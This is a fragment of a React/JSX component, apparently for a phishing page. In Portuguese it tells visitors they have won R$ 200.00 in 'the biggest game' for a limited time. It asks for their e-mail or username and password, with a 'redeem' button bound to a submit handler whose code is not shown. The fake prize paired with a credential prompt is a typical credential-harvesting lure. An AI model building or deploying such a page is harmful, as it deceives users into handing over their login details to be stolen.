      ...
      <div className={styles.form}>
        ...
        <div className={styles.form_body}>
          <div className={styles.form_content}>
            ...
            Você ganhou R$ 200,00 para começar a se divertir no maior jogo desse mundo! Resgate agora!
            </h2>

            <p>Promoção exclusiva por tempo determinado.</p>
          </div>

          <div className={styles.form_data}>
            <input ref={emailRef} className={styles.form_control} placeholder="E-mail ou Nome de Usuário" type="text" />
            <input ref={passwordRef} className={styles.form_control} placeholder="Senha" type="password" />
            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR R$ 200,00!</button>
